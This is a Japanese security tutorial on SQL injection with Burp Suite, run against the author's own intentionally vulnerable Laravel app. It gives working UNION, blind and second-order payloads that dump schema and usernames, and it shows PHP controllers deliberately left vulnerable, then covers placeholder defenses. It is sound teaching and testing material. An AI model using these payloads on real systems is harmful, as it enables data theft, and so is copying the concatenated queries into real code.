---
title: "Burp Suiteで学ぶSQLインジェクション入門 ― 自作やられアプリで基礎から実践まで"
emoji: "🔍"
type: "tech"
topics: ["burpsuite", "sqlinjection", "security", "laravel", "ctf"]
published: false
---

## 1. はじめに

⚠️ **免責事項・法律について**

本記事で紹介する攻撃手法は、**自分が管理するシステム、または明示的な許可を得たシステムに対してのみ実施してください。**
許可なく他者のシステムに攻撃を試みることは、**不正アクセス禁止法（不正アクセス行為の禁止等に関する法律）第3条**で禁止されており、同法**第11条により3年以下の拘禁刑又は100万円以下の罰金** の対象となります。本記事の内容は読者各自の責任において、適切な環境でのみ利用してください。

---

この記事では、Burp Suite を使って SQLインジェクション（SQLi）を実際に手を動かしながら学びます。

学習に使うのは、記事の著者が自作した「やられアプリ」**sqli-lab** です。意図的に脆弱な実装が施されており、安全なローカル環境で攻撃を体験できます。

**この記事で学べること:**

- SQL インジェクションの原理（なぜ文字列結合が危険なのか）
- UNION-based SQLi でデータベースの内部情報を抜く手順
- Blind SQLi（Boolean-based / Time-based）の考え方と実践
- Second-order SQLi ― 「登録時に仕込んで、後で発火」という二段階攻撃
- プレースホルダによる対策の仕組み

**前提知識:**

- `SELECT * FROM products WHERE name = 'キーワード'` 程度の SQL が読める
- コマンドライン（bash）の基本操作ができる（Windows の場合は Git Bash 推奨）
- Burp Suite をインストール済み、またはこれからインストールする

---

## 2. 前提知識: SQL クエリの基礎

SQL インジェクションを理解するには、まず正常な SQL がどのように動くかを押さえておく必要があります。

### SELECT と WHERE

```sql
SELECT * FROM products WHERE name LIKE '%ボールペン%';
```

これは `products` テーブルから、`name` に「ボールペン」が含まれる行をすべて取得するクエリです。

### プログラムからの動的クエリ生成

Web アプリでは、ユーザーの入力をクエリに組み込んで実行します。

```php
// 一般的なPHPの例 ― 脆弱な書き方
$keyword = $_GET['keyword'];  // ユーザー入力: "ボールペン"
$sql = "SELECT * FROM products WHERE name LIKE '%" . $keyword . "%'";
// 実際に実行されるSQL:
// SELECT * FROM products WHERE name LIKE '%ボールペン%'
```

ユーザーが普通に使う分には問題ありません。しかし、`$keyword` に **SQL の構文として解釈される文字** を含む値が入ると、クエリの構造が壊れます。これが SQL インジェクションです。

以下の図で、正常な入力と悪意ある入力でクエリがどう変わるかを見てみましょう。

```sql
-- ✅ 正常な入力: keyword = "ボールペン"

SELECT * FROM products WHERE name LIKE '%ボールペン%'
--                                      ^^^^^^^^^
--                                      ユーザー入力（文字列の中に収まっている）


-- ❌ 悪意ある入力: keyword = "%' UNION SELECT 1,2,3,4,5,6,7 --"

SELECT * FROM products WHERE name LIKE '%%' UNION SELECT 1,2,3,4,5,6,7 --%'
--                                       ^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^  ^^^
--                                       │  注入されたSQL（実行される！）   │
--                                       │                                └ テンプレートの残りを無効化
--                                       └ シングルクォートで文字列が終了
```

テンプレート側が意図していた `'` の閉じカッコより前に、入力値の `'` が現れてしまったことでクエリの構造が崩れます。

SQL インジェクションの仕組みをより詳しく知りたい方は以下を参照してください。

- [安全なウェブサイトの作り方 1.1 SQLインジェクション（IPA）](https://www.ipa.go.jp/security/vuln/websecurity/sql.html) ― 日本語で読める公式解説。脅威・対策が網羅されています。
- [SQL injection（PortSwigger Web Security Academy）](https://portswigger.net/web-security/sql-injection) ― Burp Suite 開発元による解説。コード例と攻撃パターンが充実しています（英語）。

---

## 3. 環境構築

### 3-1. やられアプリ「sqli-lab」の紹介

sqli-lab は、この記事の学習用に開発し、GitHub に公開している Web アプリです。Laravel 12 + SQLite で構築されており、以下の3画面で SQLi を体験できます。

| 画面 | URL | 演習内容 |
|---|---|---|
| 商品検索 | `/search` | UNION-based SQLi / Blind SQLi |
| ユーザー登録 | `/register` | Second-order の入口（ペイロードを保存） |
| プロフィール | `/profile/{id}` | Second-order の発火点 |

### 3-2. セットアップ手順

**動作要件:** PHP 8.2+、Composer
（※ アプリ本体は Tailwind CDN を使用しており Node.js は不要です）

```bash
# リポジトリをクローン
git clone https://github.com/sugarless1101/SQLi-LAB.git
cd SQLi-LAB

# PHP依存パッケージをインストール
composer install

# 環境設定ファイルを作成
cp .env.example .env
php artisan key:generate

# SQLiteデータベースを作成してマイグレーション + シード
touch database/database.sqlite   # Windows の場合は下記参照
php artisan migrate --seed

# 開発サーバーを起動（8080 番ポートで起動）
php artisan serve --port=8080
# → http://127.0.0.1:8080 でアクセス可能
```

> **Windows (PowerShell) で `touch` が使えない場合:**
> ```powershell
> New-Item -ItemType File database/database.sqlite
> ```

ブラウザで `http://127.0.0.1:8080/search` にアクセスし、商品一覧が表示されれば OK です。

> **リセットしたいときは:**
> ```bash
> php artisan migrate:fresh --seed
> ```

### 3-3. Burp Suite Community のインストールとプロキシ設定

Burp Suite は HTTP リクエストを傍受・改ざんできる Web セキュリティテストツールです。Community 版（無料）で本記事の演習はすべて実施できます。

1. [PortSwigger 公式サイト](https://portswigger.net/burp/communitydownload)からダウンロードしてインストール
2. Burp Suite を起動

本記事では **Burp Suite 内蔵ブラウザ**（Open Browser）を使います。内蔵ブラウザは Burp のプロキシを自動的に経由するため、プロキシ設定は不要です。

3. Burp Suite の **Proxy** タブ → **Open Browser** ボタンをクリック

![Burp Suite の Proxy タブで Open Browser ボタンを確認している画面](/images/09-burp-proxy-setup.png)

4. 内蔵ブラウザで `http://127.0.0.1:8080/search` にアクセスすると、**HTTP history** にリクエストが記録される

> **外部ブラウザ（Chrome など）を使いたい場合**
> Burp のプロキシリスナーのアドレス（Settings → Tools → Proxy → Proxy listeners で確認）をブラウザのプロキシ設定に入力してください。その際、`127.0.0.1` がプロキシの除外リスト（「ローカルアドレスにはプロキシを使わない」設定）に入っていると Burp に流れないため、除外を外す必要があります。FoxyProxy などの拡張機能を使うと切り替えが便利です。

---

## 4. Burp Suite の基本操作

### 4-1. Proxy → HTTP history → Repeater の流れ

まず SQLi の演習に入る前に、Burp Suite の基本操作を無害なリクエストで練習します。

1. Burp Suite 内蔵ブラウザで `http://127.0.0.1:8080/search` にアクセス
2. Burp Suite の **Proxy** → **HTTP history** タブを開く
3. `/search` への GET リクエストが記録されているはず
4. そのリクエストを右クリック → **Send to Repeater**

![Burp Suite Repeater でリクエストを送信する画面](/images/10-burp-repeater.png)

**Repeater** は HTTP リクエストを自由に編集して何度でも再送できるツールです。SQLi の演習では、クエリパラメータをここで変更しながら試します。

#### Repeater でのエンコード操作

ペイロードにスペースや記号が含まれる場合、URL エンコードが必要になることがあります。Repeater 上でテキストを選択して以下のショートカットが使えます:

| ショートカット | 操作 |
|---|---|
| `Ctrl+U` | 選択テキストを URL エンコード |
| `Ctrl+Shift+U` | 選択テキストを URL デコード |

例えば `' UNION SELECT 1,2,3 --` を送る場合、スペースを `+` や `%20` に変換する必要があるケースでこのショートカットが役立ちます。

### 4-2. Intercept の ON/OFF

毎回リクエストを手動で承認するのは演習中に邪魔になります。

- 通常は **Intercept is off** にしておき、HTTP history で記録だけさせる
- 特定のリクエストを捕まえたいときだけ **Intercept is on** にする

---

## 5. SQL インジェクションの原理

### 5-1. 文字列結合の危険性

Web アプリでよくあるパターンとして、ユーザーの入力をそのまま SQL 文字列に連結してクエリを組み立てる実装があります:

```
SQL文 = "SELECT ... WHERE name LIKE '%" + ユーザー入力 + "%'"
```

`ユーザー入力` が `ボールペン` なら正常に動きます:

```sql
SELECT * FROM products WHERE name LIKE '%ボールペン%'
-- 問題なし
```

しかし `ユーザー入力` に **`'`（シングルクォート）** を含む値を入れると:

```sql
SELECT * FROM products WHERE name LIKE '%%' UNION SELECT 1,2,3,4,5,6,7 --'
--                                      ↑ここでLIKEの文字列が終わり、後ろがSQLとして解釈される
```

`'` が **SQL の文字列区切り** として機能してしまい、クエリの構造が変わります。これが SQL インジェクションの本質です。

実際にどのコードがこの構造になっているかは、6-3 の種明かしで確認します。

### 5-2. 安全なコードとの比較

```php
// 安全な書き方: プレースホルダ（パラメタライズドクエリ）
$results = DB::select(
    "SELECT * FROM products WHERE name LIKE ?",
    ['%' . $keyword . '%']
);
```

プレースホルダを使うと、`$keyword` の中身が **SQL の構文** ではなく **文字列の値** として扱われます。シングルクォートが含まれていても、SQL の文法に影響を与えません。

| 書き方 | 動作 | 安全性 |
|---|---|---|
| 文字列結合 | SQL 文に直接展開される | ❌ 危険 |
| プレースホルダ | 値として安全に渡される | ✅ 安全 |

---

## 6. 実践①: UNION-based SQLi

### 6-1. 概要

UNION-based SQLi は、`UNION SELECT` を使って **本来のクエリに別のクエリを結合** し、その結果を画面上に表示させる攻撃手法です。エラーメッセージや結果がそのまま表示される環境で有効です。

sqli-lab の商品検索（`/search`）はまさにこの条件を満たしています:

- `APP_DEBUG=true` でエラー詳細が表示される
- 検索結果がテーブルで一覧表示される
- 実行されたクエリが検索結果テーブルの上に表示される（学習用）

### 6-2. ハンズオン手順

#### Step 1: カラム数を特定する

`UNION SELECT` は元のクエリと **カラム数が一致** しないとエラーになります。まずカラム数を探ります。

Repeater で以下を順に試します（`keyword` パラメータに入力）:

```
%' UNION SELECT 1,2,3 --
```
→ **SQL エラー画面が表示される**（UNION の左右でカラム数が合わないため）

```
%' UNION SELECT 1,2,3,4,5,6,7 --
```
→ エラーが消えて結果が返ってくれば、products テーブルは **7カラム**

![7カラムで UNION SELECT が成功した画面](/images/01-union-column-count.png)

> **なぜ 1,2,3... と書くのか?** UNION で結合する側のクエリは、何らかの値を返す必要があります。整数リテラル `1,2,3...` は最もシンプルな方法で、カラム数の確認だけが目的のときに使います。

#### Step 2: sqlite_version() でデータベースを確認

カラム数がわかったので、次は実際に情報を抜きます。3番目のカラム（`category`）に `sqlite_version()` を仕込みます:

```
%' UNION SELECT 1,2,sqlite_version(),4,5,6,7 --
```

![sqlite_version() の取得結果](/images/02-union-sqlite-version.png)

結果の `category` 列に SQLite のバージョン文字列が表示されれば成功です。

#### Step 3: スキーマを抽出する

SQLite には `sqlite_master` という特殊なテーブルがあり、全テーブルの定義（CREATE TABLE 文）が格納されています。

```
%' UNION SELECT 1,2,name,4,5,6,7 FROM sqlite_master WHERE type='table' --
```
→ テーブル名一覧が取得できる

```
%' UNION SELECT 1,2,sql,4,5,6,7 FROM sqlite_master WHERE name='users' --
```
→ `users` テーブルの CREATE TABLE 文が表示される

![sqlite_master からスキーマを抽出した画面](/images/03-union-schema-extract.png)

これにより `users` テーブルに `username`、`email` などのカラムが存在することがわかります。あとは同様の手順でデータを取得できます。

### 6-3. 種明かし: SearchController のコードリーディング

:::details SearchController のコードを読む

なぜこの攻撃が成立したのかを、コードで確認します。

```php
// app/Http/Controllers/SearchController.php

$keyword = $request->input('keyword', '');

// VULNERABLE: ユーザー入力を直接文字列結合して LIKE 句に渡している。
// sqli 演習の本丸。プレースホルダを使わないため UNION / Blind が成立する。
$sql = "SELECT * FROM products WHERE name LIKE '%" . $keyword . "%'";

// 注意: try/catch しない。SQL エラーは APP_DEBUG=true でそのまま画面に出して
// 学習者がエラーメッセージから情報を抜く演習を行えるようにする。
$results = DB::select($sql);
```

ポイントは2つです:

1. `$keyword` がそのまま文字列結合されており、シングルクォートがエスケープされない
2. エラーをキャッチせず、DB エラーがそのまま画面に出る（`APP_DEBUG=true` 前提）

:::

### 6-4. SQLi が引き起こす被害

SQLi は長年にわたって最も深刻な Web 脆弱性の一つとされています。IPA（独立行政法人情報処理推進機構）の「[安全なウェブサイトの作り方](https://www.ipa.go.jp/security/vuln/websecurity/about.html)」でも筆頭に挙げられており、個人情報漏洩を引き起こした過去のインシデントの多くが SQL インジェクションを原因としています。具体的な公開事例の分析は今後の記事で扱う予定です。

---

## 7. 実践②: Blind SQLi

### 7-1. 概要（UNION-based が使えないケース）

UNION-based SQLi は **画面に結果が表示される** ことが前提です。しかし実際のアプリでは:

- エラーメッセージを隠している
- 検索結果を「件数」しか表示しない
- エラー時に「エラーが発生しました」とだけ表示する

このような場合、画面の **挙動の違い** だけを手がかりに情報を抽出するのが **Blind SQLi** です。

sqli-lab では、UNION-based と同じ `/search` エンドポイントを使いますが、ペイロードの種類が違います。

### 7-2. ハンズオン手順

#### Boolean-based Blind

真（TRUE）のとき検索結果が返り、偽（FALSE）のとき結果が0件になる差分を使います。

```
%' AND 1=1 --
```
→ 通常の検索結果が返る（真: 差分なし）

```
%' AND 1=2 --
```
→ 結果が0件になる（偽: 条件を追加すると結果が消える）
(※True ↓)
![Boolean-based Blind: 真の場合（結果あり）](/images/04-boolean-true.png)
(※False ↓)
![Boolean-based Blind: 偽の場合（0件）](/images/05-boolean-false.png)

この差分を利用して、1文字ずつ情報を抽出できます:

```sql
-- SQLite のバージョン文字列の1文字目が '3' かどうかを確認
%' AND SUBSTR(sqlite_version(),1,1)='3' --
-- → 真なら結果あり、偽なら0件
```

これを繰り返すことで、画面に値が表示されなくても情報を1文字ずつ特定できます（自動化ツールの SQLmap はこれを高速で行います）。

#### Time-based Blind

画面の表示内容に全く差が出ない場合でも、**レスポンス時間の差** で情報を抽出できます。

> **⚠️ SQLite には `SLEEP()` 関数がありません。**
> MySQL の `SLEEP(5)` のような関数は SQLite では動作しません。
> sqli-lab では、大量のランダムデータを生成する `randomblob()` を使って遅延を擬似的に再現しています。
>randomblob() による遅延は学習用の疑似再現であり、環境によって遅延の出方は安定しない場合があります。
>本番環境のSQLiteで一般化できる手法として理解するのではなく、「時間差を観測する考え方の練習」として捉えてください。

```
%' AND CASE WHEN 1=1 THEN randomblob(100000000) ELSE 1 END --
```
→ 条件が真のとき `randomblob(100000000)`（約100MB）の生成処理が走り、レスポンスが遅延する

![Time-based Blind: randomblob() による遅延（画面下部のレスポンス時間に注目）](/images/06-time-based.png)

Burp Suite の Repeater 画面下部に表示されるレスポンス時間を確認し、遅延の有無で真偽を判定します。筆者環境での実測値: **2,971 ms**（通常リクエストは数十～数百 ms 程度のため、遅延が明確に確認できます）。

### 7-3. 種明かし

UNION-based と同じく、`SearchController.php` の文字列結合クエリが根本原因です。`AND` 条件を追加しても構文エラーにならないのは、ペイロードが SQL として有効に解釈されているためです。

### 7-4. Blind SQLi が意味すること

エラーメッセージを隠したり、結果を「件数のみ」表示に制限したりしても、SQLi を根本的に防ぐことはできません。Blind SQLi はそのような「表示制限による対策」を無効化する手法です。根本対策（プレースホルダ）なしに表示を制限するだけでは、攻撃者の手間を増やすだけで情報漏洩は防げません。

---

## 8. 実践③: Second-order SQLi

### 8-1. 概要

Second-order SQLi（二次 SQL インジェクション）は、**攻撃が2段階に分かれる** 点が特徴です。

1. **第1段階（登録）**: 入力値を検証せずにデータベースへ保存
2. **第2段階（利用）**: DB から取り出した値を「安全な値」と信頼して別のクエリに結合 → 発火

攻撃者から見ると「入力した瞬間には何も起きない」のが厄介なポイントです。また開発者から見ると「DB から取ってきた値なのに危ない」という直感に反する挙動であるため、見落とされやすい脆弱性です。

> 💡 **なぜ見落とされやすいのか**
> 登録時に「特殊文字を含む入力はバリデーションした」「DB に入れるとき INSERT は正しく動いた」と確認したとします。この時点では発火していないだけです。問題は**その後**です。「DB から取り出した値はもう安全なはず」と思い込んで、別のクエリに文字列結合して使う――この「一度 DB を経由したから信頼できる」という思い込みが Second-order SQLi の穴です。

sqli-lab では:
- `/register` がペイロードを `users.username` に保存する（入口）
- `/profile/{id}` が `username` を posts クエリに結合する（発火点）

### 8-2. ハンズオン手順

#### なぜシングルクォートを2個ずつ書くのか

Second-order のペイロード入力では、**シングルクォートを `''`（2個）と書く**必要があります。

理由は INSERT 文の文字列リテラルの仕組みにあります:

```sql
-- 登録フォームに入力した値がそのまま埋め込まれる INSERT 文
INSERT INTO users (username, email, created_at)
VALUES (' ← ここに入力値が展開される → ', 'email', datetime('now'))
```

もし入力値に `'` が1つあると、文字列リテラルが途中で終わり、**INSERT 自体が構文エラー**になります。

しかし SQL では `''`（シングルクォート2個）は **エスケープされたシングルクォート1文字** として解釈されます。

つまり:

| 入力（フォームに打つ） | DB に保存される実際の値 |
|---|---|
| `admin'' OR ''1''=''1` | `admin' OR '1'='1` |
| `'' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name=''users'' --` | `' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name='users' --` |

DB に保存された時点では「ただの文字列」ですが、`/profile/{id}` でクエリに結合されると本物の SQL として発火します。

#### Step 1: ペイロードを登録する

`/register` にアクセスし、以下を入力して登録します:

```
ユーザー名: '' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name=''users'' --
メール:     test@example.com
```

![/register に Second-order 用ペイロードを入力している画面](/images/07-register-payload.png)

登録が完了すると `ユーザー "{username}" を登録しました。ID: {id}` と表示され、`/profile/{id} を開く →` のリンクが現れます。この ID を控えておきます。

#### Step 2: /profile/{id} にアクセスして発火させる

控えた ID を使って `/profile/{id}` にアクセスします（例: `/profile/9`）。

このとき `ProfileController.php` が以下のクエリを実行します:

```php
// まずユーザー情報を取得（プレースホルダで安全）
$user = DB::select("SELECT * FROM users WHERE id = ?", [$id]);
$username = $user[0]->username;

// VULNERABLE: DB から取り出した username を信頼して文字列結合している。
// 登録時に仕込まれた SQL ペイロードがここで実行される（Second-order SQLi）
$postsSql = "SELECT * FROM posts WHERE author = '" . $username . "'";
$posts = DB::select($postsSql);
```

`$username` には DB から取得した値（= 登録時に保存したペイロード）が入っています。これが展開されると:

```sql
SELECT * FROM posts WHERE author = '' UNION SELECT 1,2,sql,4,5 FROM sqlite_master WHERE name='users' --'
```

`posts` テーブルの検索に `sqlite_master` からのデータが UNION で結合され、`users` テーブルの CREATE TABLE 文が表示されます。

![/profile/{id} で Second-order が発火した画面](/images/08-profile-second-order.png)

### 8-3. 種明かし: RegisterController → ProfileController

:::details RegisterController / ProfileController のコードを読む

```php
// app/Http/Controllers/RegisterController.php
// VULNERABLE: バリデーションも escape もなしで INSERT
DB::insert(
    "INSERT INTO users (username, email, created_at) VALUES ('"
    . $username . "', '" . $email . "', datetime('now'))"
);
```

```php
// app/Http/Controllers/ProfileController.php
// 第1クエリ: プレースホルダで安全 ← ここは安全
$user = DB::select("SELECT * FROM users WHERE id = ?", [$id]);
$username = $user[0]->username;

// 第2クエリ: DB から取得した値を文字列結合 ← ここで発火
// VULNERABLE: DB から取り出した username を信頼して文字列結合している。
$postsSql = "SELECT * FROM posts WHERE author = '" . $username . "'";
```

**重要な教訓**: 「DB から取ってきた値だから安全」は誤りです。DB に保存されている値がどこから来たか（= 最終的にはユーザー入力）を考慮する必要があります。

:::

### 8-4. Second-order が示す教訓

Second-order SQLi は、登録直後のバリデーションだけでは防げません。「DB から取り出した値を再利用する箇所」すべてにプレースホルダを適用することが必要です。入力チェックと出力（クエリへの組み込み）対策は別の問題として扱う必要があります。

---

## 9. 対策

### 9-1. パラメタライズドクエリ（プレースホルダ）

最も確実な対策は、ユーザー入力を SQL の文字列リテラルに直接埋め込まず、**プレースホルダ**を使うことです。

```php
// ❌ 脆弱な書き方
$sql = "SELECT * FROM products WHERE name LIKE '%" . $keyword . "%'";
$results = DB::select($sql);

// ✅ 安全な書き方
$results = DB::select(
    "SELECT * FROM products WHERE name LIKE ?",
    ['%' . $keyword . '%']
);
```

`?` プレースホルダを使うと、`$keyword` の中に `'` や `--` が含まれていても SQL の文法として解釈されません。

### 9-2. Eloquent / クエリビルダを使う

Laravel の Eloquent や クエリビルダは内部で PDO のプレースホルダを使います。

```php
// クエリビルダ（自動的にプレースホルダが使われる）
$results = DB::table('products')->where('name', 'like', '%' . $keyword . '%')->get();
```

文字列を自分で組み立てる必要がないため、インジェクションが混入しにくいです。

> **注意**: Eloquent を使っても `DB::select()` で生 SQL を書けば脆弱になります。「Eloquent だから安全」ではなく、「プレースホルダが使われているから安全」と理解してください。

### 9-3. WAF・入力バリデーションの限界

「入力時に特殊文字を弾けばいいのでは？」という考えは Second-order SQLi の前では無力です。

- 入力時に `'` を弾いても、SQL エスケープ（`''` への変換）を施して保存すれば INSERT は成功する。そのエスケープ済みの値が後段のクエリに文字列結合されると、改めて SQL として解釈され得る
- DB に保存された後のクエリ結合は入力バリデーションでは防げない
- WAF はバイパスされることがある

**根本対策はプレースホルダの徹底適用**です。DB から取り出した値を再度クエリに使う箇所も含め、すべてにプレースホルダを使ってください。

---

## 10. チャレンジ演習

以下の3問を自分の手で試してみましょう。sqli-lab を使って実際に確認できます。

---

### 問題1（易）: users テーブルの全 username を抽出せよ

**ヒント**: `/search` で UNION-based SQLi を使い、`users` テーブルから `username` カラムを取得してください。

:::details 解答を見る

```
%' UNION SELECT 1,username,3,4,5,6,7 FROM users --
```

`users` テーブルの全行の `username` が、検索結果の「**商品名**」列に表示されます。

シードデータのユーザー（`admin` / `tanaka` / `guest`）が抽出できれば成功です。

`users` テーブルのカラム定義は事前に sqlite_master で確認できます:
```
%' UNION SELECT 1,2,sql,4,5,6,7 FROM sqlite_master WHERE name='users' --
```

:::

---

### 問題2（中）: sqlite_version() の最初の文字をBoolean-based Blind で特定せよ

**ヒント**: `SUBSTR()` と `AND` 条件、そして検索結果の有無（0件 vs 結果あり）の差分を使います。

:::details 解答を見る

```
-- '3' の場合に結果が返ってくる
%' AND SUBSTR(sqlite_version(),1,1)='3' --
```

結果が返ってきたら1文字目は `3`。

続けて先頭3文字を絞り込みます（Step 2 で確認したバージョン文字列の先頭3文字を使います）:
```
%' AND SUBSTR(sqlite_version(),1,3)='X.X' --
```
`X.X` の部分は、Step 2 で `sqlite_version()` から取得したバージョンの先頭3文字に置き換えてください（例: `3.3`、`3.4`、`3.5` など）。このように1文字ずつ絞り込むことで、画面に何も表示されなくてもバージョン文字列全体を特定できます。

:::

---

### 問題3（難）: Second-order SQLi で posts テーブルの全タイトルを抽出せよ

**ヒント**: `/register` でユーザー登録時に posts テーブルに対する UNION SELECT ペイロードを仕込み、`/profile/{id}` で発火させてください。posts テーブルのカラム数は **5** です。

:::details 解答を見る

**Step 1: /register でペイロードを登録**

```
ユーザー名: '' UNION SELECT 1,title,3,4,5 FROM posts --
メール:     attacker@example.com
```

**Step 2: /profile/{id} にアクセス**

登録完了後に表示された ID（例: `/profile/10`）にアクセスすると、
posts テーブルの全レコードの `title` が author 列（2列目）に表示されます。

発火する SQL:
```sql
SELECT * FROM posts WHERE author = '' UNION SELECT 1,title,3,4,5 FROM posts --'
```

:::

---

## 11. まとめ

本記事では sqli-lab を使い、以下の3手法を体験しました。

| 手法 | 特徴 | 演習場所 |
|---|---|---|
| UNION-based SQLi | 結果が画面に表示される環境で有効。UNION SELECT でデータを抽出 | `/search` |
| Blind SQLi (Boolean / Time) | 画面に結果が出なくても挙動の差や応答時間を手がかりにする | `/search` |
| Second-order SQLi | 登録時に仕込んで、別の画面で発火。DB 由来の値も安全ではない | `/register` → `/profile` |

**共通の教訓**: 根本原因はすべて「文字列結合による動的クエリ生成」です。**プレースホルダを徹底する**ことで3手法すべてを防げます。

---

**sqli-lab リポジトリ:**
https://github.com/sugarless1101/SQLi-LAB

**次のステップ:**
- XSS（クロスサイトスクリプティング）: ユーザー入力がHTMLに埋め込まれる場合の攻撃
- CSRF（クロスサイトリクエストフォージェリ）: ユーザーの認証済みセッションを悪用する攻撃
- CTF の Web カテゴリ: [picoCTF](https://picoctf.org/)、[HackTheBox](https://www.hackthebox.com/)、[TryHackMe](https://tryhackme.com/) で実践を積む
